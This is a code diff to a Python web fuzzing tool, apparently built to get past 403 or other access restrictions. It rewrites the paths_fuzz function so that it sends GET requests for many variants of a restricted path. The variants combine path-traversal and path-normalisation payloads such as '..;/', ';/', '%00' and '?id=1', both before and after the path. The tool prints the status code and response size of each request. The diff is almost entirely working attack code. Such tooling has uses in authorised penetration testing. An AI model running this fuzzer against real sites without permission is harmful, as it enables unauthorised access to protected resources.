@@ -124,34 +124,28 @@ def headers_fuzz(url, path, cookie=None, redirect=False):
     print(common.good_code(resp.status_code,f" Referer: /{path} [code:{resp.status_code} size:{len(resp.content)}]"))
 
             
-def paths_fuzz(url, path, cookie=None, redirect=False):
-    paths_payloads = [f"{url}/{path}",
-                      f"{url}/.{path}",
-                      f"{url}/./{path}",
-                      f"{url}/../{path}",
-                      f"{url}/;/{path}",
-                      f"{url}/.;/{path}",
-                      f"{url}/..;/{path}",
-                      f"{url}//;//{path}",
-                      f"{url}/../{path}",
-                      f"{url}/{path.upper()}",
-                      f"{url}/.{path.upper()}",
-                      f"{url}/./{path.upper()}",
-                      f"{url}/../{path.upper()}",
-                      f"{url}/;/{path.upper()}",
-                      f"{url}/.;/{path.upper()}",
-                      f"{url}/..;/{path.upper()}",
-                      f"{url}//;//{path.upper()}",
-                      f"{url}/../{path.upper()}"]
+def paths_fuzz(url, path, cookie=None, redirect=False):  
+    payloads = [ ".", "./", "../", ";/", ".;/", "..;/", "/;//", "*", "#", "?", "?id=1", "??", "??id=1", "???", "???id=1", ".json", ".", "%00", "%20", "%09"]
+    
+    resp = requests.get(f"{url}/{path}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect)
+    print(common.good_code(resp.status_code, f"{url}/{path} [code:{resp.status_code} size:{len(resp.content)}]"))
+    resp = requests.get(f"{url}/{path.upper()}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect)
+    print(common.good_code(resp.status_code, f"{url}/{path.upper()} [code:{resp.status_code} size:{len(resp.content)}]"))
+    for payload_one in payloads:
+        resp = requests.get(f"{url}/{payload_one}{path}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect)
+        print(common.good_code(resp.status_code, f"{url}/{payload_one}{path} [code:{resp.status_code} size:{len(resp.content)}]"))
+        resp = requests.get(f"{url}/{payload_one}{path.upper()}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect)
+        print(common.good_code(resp.status_code, f"{url}/{payload_one}{path.upper()} [code:{resp.status_code} size:{len(resp.content)}]"))
+        for payload_two in payloads:           
+            resp = requests.get(f"{url}/{payload_one}{path}{payload_two}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect)
+            print(common.good_code(resp.status_code, f"{url}/{payload_one}{path}{payload_two} [code:{resp.status_code} size:{len(resp.content)}]"))
+            resp = requests.get(f"{url}/{payload_one}{path.upper()}{payload_two}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect)
+            print(common.good_code(resp.status_code, f"{url}/{payload_one}{path.upper()}{payload_two} [code:{resp.status_code} size:{len(resp.content)}]"))            
+            resp = requests.get(f"{url}/{payload_one}{path}/{payload_two}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect)
+            print(common.good_code(resp.status_code, f"{url}/{payload_one}{path}/{payload_two} [code:{resp.status_code} size:{len(resp.content)}]"))
+            resp = requests.get(f"{url}/{payload_one}{path.upper()}/{payload_two}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect)
+            print(common.good_code(resp.status_code, f"{url}/{payload_one}{path.upper()}/{payload_two} [code:{resp.status_code} size:{len(resp.content)}]"))
 
-    payloads = ["/", "/.", "/./", "/../", "/;/", ".;/", "/.;/", "./", "../", "/;/", "//;//", "..;/", "/..;/", "/*", "*", "#", "?", "?id=1", "??", "??id=1", "???", "???id=1", ".json", ".", "%00", "%20", "%09"]
-        
-    for path_payload in paths_payloads:
-        resp = requests.get(f"{path_payload}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect)        
-        print(common.good_code(resp.status_code, f"{path_payload} [code:{resp.status_code} size:{len(resp.content)}]"))
-        for payload in payloads:           
-            resp = requests.get(f"{path_payload}{payload}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect)        
-            print(common.good_code(resp.status_code, f"{path_payload}{payload} [code:{resp.status_code} size:{len(resp.content)}]"))
 
 
 def parse_slash(url, path):
